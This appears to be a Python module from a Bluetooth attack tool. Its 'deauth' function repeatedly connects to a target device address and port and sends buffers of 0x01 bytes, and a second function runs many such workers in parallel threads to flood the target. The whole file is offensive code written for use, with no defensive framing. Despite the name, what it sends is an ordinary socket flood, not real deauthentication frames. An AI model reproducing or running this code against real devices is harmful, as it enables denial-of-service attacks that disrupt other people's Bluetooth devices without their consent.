import bluetooth
import time

from utils.async_utils import create_async_task
from utils.bt_utils import BTProtocol

def deauth(target: str, port: int, protocol: BTProtocol, packet_size: int, worker_id: int):
    worker = f"Worker-{str(worker_id).zfill(2)}"
    job_id = 0

    while True:
        job = f"Job-{job_id}"
        prefix = f" > [{worker} | {job}]    "
        
        # Create socket.
        print(f"{prefix}Connecting {target} using {protocol.name.upper()} protocol (Port {port})...")
        sock = bluetooth.BluetoothSocket(protocol.value)  
        bd_dev = (target, port)
        
        # Connect socket
        try:
            sock.connect(bd_dev)
            sock.settimeout(10)
            
            # Send deauth packet
            payload = b'\x01' * packet_size
            print(f"{prefix}Sending deauth packets to {target} ({len(payload)} buffer size) ...")
            sock.send(payload)
        except bluetooth.BluetoothError as e:
            print(f"{prefix}Failed to connect to {target}: {e}")
            break
        finally:
            sock.close()
        
        time.sleep(1)
        job_id += 1
        
def deauth_async(target: str, port: int, protocol: BTProtocol, packet_size: int, threads: int):
    create_async_task(threads, deauth, (target, port, protocol, packet_size))